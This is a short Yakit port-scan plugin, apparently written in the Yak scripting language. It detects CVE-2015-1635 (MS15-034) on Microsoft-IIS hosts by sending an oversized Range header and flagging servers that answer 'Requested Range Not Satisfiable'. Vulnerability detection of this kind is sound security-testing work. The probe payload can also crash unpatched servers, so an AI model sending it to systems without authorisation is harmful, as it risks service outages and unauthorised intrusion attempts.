# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `
GET / HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cache-Control: no-cache
Pragma: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Range: bytes=0-18446744073709551615
`

    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    // dump(rsp)
    if len(rsp) > 0 {
        
        if str.MatchAllOfSubString(rsp, "Requested Range Not Satisfiable"){
            yakit.Info("%v found CVE-2015-1635(MS15-034) IIS远程代码执行漏洞 ", addr)
            risk.NewRisk(
            addr,risk.title("CVE-2015-1635(MS15-034)"),
            risk.severity("high"),
            risk.titleVerbose("CVE-2015-1635(MS15-034) IIS远程代码执行漏洞"),
            risk.type("rce[IIS]"),
            risk.payload(`Range: bytes=0-18446744073709551615`),
        )
        }
       
    }

    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        if str.MatchAllOfSubString(result.Fingerprint.Banner, "Microsoft-IIS") {
            handleCheck(result.Target,result.Port)
        }
        
    }
    
}
